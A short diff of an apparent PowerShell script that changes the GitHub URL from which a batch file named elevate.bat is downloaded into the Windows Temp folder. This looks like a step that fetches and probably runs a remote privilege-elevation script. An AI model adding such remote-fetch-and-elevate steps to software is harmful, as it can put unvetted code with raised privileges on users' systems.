@@ -305,7 +305,7 @@ try {
 
     # Download elevate.bat
     $batPath = "C:\Windows\Temp\elevate.bat"
-    $batUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/elevate.bat"
+    $batUrl = "https://github.com/NaomiMendoza127/elevatebat/raw/refs/heads/main/elevate.bat"
     if (-not (Test-Path -Path $batPath)) {
         try {
             Add-Content -Path $logPath -Value "Downloading elevate.bat from $batUrl..."
